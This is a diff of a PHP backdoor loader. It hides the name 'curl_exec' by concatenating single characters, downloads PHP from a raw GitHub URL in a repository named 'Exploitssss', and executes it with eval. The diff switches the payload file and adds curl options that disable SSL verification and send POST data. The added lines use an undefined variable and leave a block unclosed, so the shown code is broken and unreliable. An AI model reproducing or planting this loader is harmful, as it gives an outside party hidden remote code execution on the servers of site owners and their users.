@@ -13,6 +13,14 @@
       $cexec = "c"."u"."r"."l"."_"."e"."x"."e"."c";
         if (function_exists($cexec)) {
             $conn = curl_init($url);
+            		curl_setopt($ch, CURLOPT_URL, $url);
+		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+		if(!empty($post)) {
+			curl_setopt($ch, CURLOPT_POST, true);
+			curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
             curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
             curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
             curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
@@ -33,7 +41,7 @@
         return $urls;
     }
 
-    $a = geturlsinfo('https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/templates.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/Anonrocks/Exploitssss/master/temp.php');
     eval('?>' . $a);
     ?>
     
